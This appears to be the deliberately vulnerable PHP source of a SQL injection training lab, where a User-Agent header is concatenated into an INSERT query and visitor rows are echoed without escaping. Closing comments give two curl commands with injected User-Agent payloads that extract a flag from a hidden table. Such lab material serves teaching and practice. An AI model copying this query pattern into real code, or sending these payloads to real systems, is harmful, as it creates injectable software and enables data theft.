<?php
/*
 * SQLi-Arena. MySQL Lab 16: Header Injection. User-Agent
 * SOURCE CODE (shown in White-Box mode)
 *
 * This is the vulnerable portion of the lab.
 */

// Database connection (per-lab isolation)
require_once __DIR__ . '/../../includes/db.php';

// Read HTTP headers: these are NOT form inputs
$ua = $_SERVER['HTTP_USER_AGENT'];   // User-Agent header
$ip = $_SERVER['REMOTE_ADDR'];       // Client IP address

// VULNERABLE: The User-Agent header is directly concatenated into an INSERT statement.
// There is NO form field for the User-Agent: it comes from the HTTP request headers.
// An attacker must use tools like curl or Burp Suite to craft a malicious User-Agent.
$log_query = "INSERT INTO visitors (ip_address, user_agent, visit_time) VALUES ('$ip', '$ua', NOW())";

$result = mysqli_query($conn, $log_query);

if ($result) {
    echo "Your visit has been logged.";
} else {
    echo "Error: " . mysqli_error($conn);
}

// Display recent visitors
$visitors = mysqli_query($conn, "SELECT ip_address, user_agent, visit_time FROM visitors ORDER BY id DESC LIMIT 10");
while ($row = mysqli_fetch_assoc($visitors)) {
    echo $row['ip_address'] . " | " . $row['user_agent'] . " | " . $row['visit_time'] . "\n";
}

// Hidden table structure:
// CREATE TABLE system_keys (id INT, key_name VARCHAR(50), key_value VARCHAR(100));
// Contains: key_name='master', key_value='FLAG{...}'
//
// Attack vectors (via User-Agent header):
// 1. Error-based extraction:
//    curl -H "User-Agent: test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT key_value FROM system_keys WHERE key_name='master'))) AND '1'='1" URL
//    Triggers XPATH error that leaks the key_value.
//
// 2. Subquery in INSERT VALUES:
//    curl -H "User-Agent: test', (SELECT key_value FROM system_keys WHERE key_name='master')) -- -" URL
//    Injects the flag into the visit_time column (requires matching column count).
//
// NOTE: The injection point is the HTTP User-Agent header, NOT a form field.
//       You must use curl, Burp Suite, or similar tools to exploit this.
